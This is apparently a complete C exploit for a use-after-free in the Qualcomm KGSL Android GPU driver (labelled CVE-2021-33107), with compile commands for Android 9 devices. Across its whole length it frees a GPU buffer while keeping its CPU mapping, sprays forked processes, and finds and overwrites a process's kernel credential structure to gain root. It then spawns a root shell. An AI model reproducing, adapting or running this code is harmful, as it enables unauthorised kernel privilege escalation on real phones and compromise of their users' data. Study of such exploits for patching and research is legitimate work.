/*
 * CVE-2021-33107 kgsl UAF exploit
 * CPU-only, no GPU commands.
 * Optimized for SD425 (Adreno 308, 32-bit GPU) on Android 9 (64-bit CPU).
 *
 * Compile (64-bit):
 *   clang -target aarch64-none-linux-android28 -O2 -fPIE -pie -pthread -o exploit exploit.c
 * Compile (32-bit, if needed):
 *   clang -target armv7a-none-linux-androideabi28 -O2 -fPIE -pie -pthread -o exploit exploit.c
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/poll.h>
#include <signal.h>
#include <poll.h>

/* ---------- KGSL ioctl definitions ---------- */
#define KGSL_IOC_TYPE 0x09

struct kgsl_gpuobj_alloc {
    uint64_t size;
    uint64_t flags;
    uint64_t va_len;
    uint64_t mmapsize;
    unsigned int id;
    unsigned int metadata_len;
    uint64_t metadata;
};
#define IOCTL_KGSL_GPUOBJ_ALLOC _IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)

struct kgsl_gpuobj_free {
    uint64_t flags;
    uint64_t priv;
    unsigned int id;
    unsigned int type;
    unsigned int len;
    unsigned int __pad;
};
#define IOCTL_KGSL_GPUOBJ_FREE _IOW(KGSL_IOC_TYPE, 0x46, struct kgsl_gpuobj_free)

/* Memory flags */
#define KGSL_MEMFLAGS_USE_CPU_MAP      (1ULL << 28)
#define KGSL_CACHEMODE_SHIFT           26
#define KGSL_CACHEMODE_MASK            (0x0C000000ULL)
#define KGSL_CACHEMODE_WRITEBACK       3

/* ---------- Exploit parameters ---------- */
#define UAF_SIZE        (2 * 1024 * 1024)   // 2 MB
#define SPRAY_PIDS      2500                // number of child processes

/* task_struct offsets (Linux 4.9/4.14) */
#define COMM_OFF        0x818
#define CRED_OFF        0x740

/* Magic string for task comm */
#define MAGIC_COMM "TASKUAF!!"
#define MAGIC_WORD1 0x4B534154   // "TASK"
#define MAGIC_WORD2 0x21464155   // "UAF!"

static int kgsl_fd = -1;

static void die(const char *msg) {
    perror(msg);
    exit(EXIT_FAILURE);
}

/* ---------- KGSL wrappers ---------- */
static int gpuobj_alloc(uint64_t size, uint64_t flags) {
    struct kgsl_gpuobj_alloc a = {
        .size = size,
        .flags = flags,
    };
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &a) < 0)
        die("gpuobj_alloc");
    return a.id;
}

static void *gpuobj_mmap(size_t size, unsigned int id) {
    /*
     * CRITICAL: KGSL mmap uses the ID directly as the page offset,
     * NOT shifted by PAGE_SHIFT.
     */
    void *p = mmap(NULL, size, PROT_READ | PROT_WRITE,
                   MAP_SHARED, kgsl_fd, (off_t)id);
    if (p == MAP_FAILED)
        die("gpuobj_mmap");
    return p;
}

static void gpuobj_free(unsigned int id) {
    struct kgsl_gpuobj_free f = { .id = id };
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &f) < 0)
        die("gpuobj_free");
}

/* ---------- Main ---------- */
int main(int argc, char **argv) {
    setbuf(stdout, NULL);

    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0) die("open /dev/kgsl-3d0");
    printf("[+] kgsl fd = %d\n", kgsl_fd);

    /* ---- Phase 1: Allocate UAF buffer and get CPU mapping ---- */
    printf("[*] Phase 1: Allocate UAF buffer (no MAP_FIXED)\n");
    uint64_t flags = KGSL_MEMFLAGS_USE_CPU_MAP |
                     ((uint64_t)KGSL_CACHEMODE_WRITEBACK << KGSL_CACHEMODE_SHIFT);

    int uaf_id = gpuobj_alloc(UAF_SIZE, flags);
    void *uaf_m = gpuobj_mmap(UAF_SIZE, uaf_id);
    uint64_t uaf_base = (uint64_t)uaf_m;
    printf("[+] UAF mapped at CPU VA: 0x%lx\n", (unsigned long)uaf_base);

    /* ---- Phase 2: Free the GPU object (CPU mapping remains) ---- */
    printf("[*] Phase 2: Free GPU object (keep CPU mapping)\n");
    gpuobj_free(uaf_id);
    printf("[+] GPU object freed; CPU mapping is now dangling\n");

    /* ---- Phase 3: Reclaim pages ---- */
    printf("[*] Phase 3: Reclaim pages (compact / drop caches)\n");
    int fd = open("/proc/sys/vm/compact_memory", O_WRONLY);
    if (fd >= 0) { write(fd, "1", 1); close(fd); }
    fd = open("/proc/sys/vm/drop_caches", O_WRONLY);
    if (fd >= 0) { write(fd, "3", 1); close(fd); }
    usleep(10000);

    /* ---- Phase 4: Fork spray ---- */
    printf("[*] Phase 4: Fork spray (%d children)\n", SPRAY_PIDS);
    int notify_pipe[2];
    if (pipe(notify_pipe) < 0) die("pipe");
    fcntl(notify_pipe[0], F_SETFD, FD_CLOEXEC);
    fcntl(notify_pipe[1], F_SETFD, FD_CLOEXEC);

    pid_t spray_pids[SPRAY_PIDS];
    int n_spray = 0;
    for (int i = 0; i < SPRAY_PIDS; i++) {
        pid_t p = fork();
        if (p == 0) {
            close(notify_pipe[0]);
            prctl(PR_SET_NAME, MAGIC_COMM);
            for (int j = 0; j < 1800; j++) {
                usleep(200000);
                if (getuid() == 0) {
                    usleep(50000);
                    pid_t me = getpid();
                    write(notify_pipe[1], &me, sizeof(me));
                    // Spawn shell
                    execl("/system/bin/sh", "sh", NULL);
                    write(1, "sh exec failed\n", 15);
                    _exit(0);
                }
            }
            close(notify_pipe[1]);
            _exit(0);
        }
        if (p > 0) {
            spray_pids[n_spray++] = p;
        } else {
            break;
        }
    }
    close(notify_pipe[1]);
    printf("  Spawned %d children\n", n_spray);
    sleep(1);

    /* ---- Phase 5: Scan UAF range for task_struct and cred ---- */
    printf("[*] Phase 5: Scanning UAF range for task_struct\n");
    uint32_t *scan = (uint32_t *)uaf_base;
    int total_words = UAF_SIZE / 4;
    bool found = false;
    uint64_t cred_offset = 0;

    for (int i = 0; i < total_words - 16; i++) {
        if (scan[i] == MAGIC_WORD1 && scan[i+1] == MAGIC_WORD2) {
            uint64_t page_base = uaf_base + (i * 4 - COMM_OFF);
            if (page_base < uaf_base || page_base >= uaf_base + UAF_SIZE)
                continue;
            uint32_t *cred_ptr = (uint32_t *)(uaf_base + (page_base - uaf_base) + CRED_OFF);
            uint32_t uid = cred_ptr[1];
            uint32_t gid = cred_ptr[2];
            uint32_t euid = cred_ptr[5];
            uint32_t egid = cred_ptr[6];
            if (uid == gid && uid == euid && uid == egid && uid > 1000 && uid < 20000) {
                found = true;
                cred_offset = (uint64_t)(cred_ptr - scan) * 4;
                printf("[+] Found valid cred at offset 0x%lx (uid=%u)\n",
                       (unsigned long)cred_offset, uid);
                break;
            }
        }
    }

    if (!found) {
        printf("[-] No cred found. Exiting.\n");
        goto cleanup;
    }

    /* ---- Phase 6: Overwrite cred ---- */
    printf("[*] Phase 6: Overwriting cred at offset 0x%lx\n", (unsigned long)cred_offset);
    uint32_t *cred = (uint32_t *)(uaf_base + cred_offset);
    for (int i = 1; i <= 8; i++) cred[i] = 0;
    cred[12] = 0xFFFFFFFF; cred[13] = 0x0000003F;
    cred[14] = 0xFFFFFFFF; cred[15] = 0x0000003F;
    cred[16] = 0xFFFFFFFF; cred[17] = 0x0000003F;
    __sync_synchronize();
    asm volatile("dsb sy" : : : "memory");
    printf("[+] Cred overwritten (uid=0)\n");

    /* ---- Phase 7: Wait for root ---- */
    printf("[*] Phase 7: Waiting for root notification...\n");
    struct pollfd pfd = { .fd = notify_pipe[0], .events = POLLIN };
    pid_t winner = 0;
    if (poll(&pfd, 1, 15000) > 0 &&
        read(notify_pipe[0], &winner, sizeof(winner)) == sizeof(winner)) {
        printf("[+] ROOT! PID = %d\n", winner);
        for (int i = 0; i < n_spray; i++)
            if (spray_pids[i] != winner) kill(spray_pids[i], SIGKILL);
        waitpid(winner, NULL, 0);
    } else {
        printf("[-] No child reported root\n");
    }

cleanup:
    close(kgsl_fd);
    for (int i = 0; i < n_spray; i++) kill(spray_pids[i], SIGKILL);
    while (wait(NULL) > 0);
    printf("[*] Done.\n");
    return 0;
}
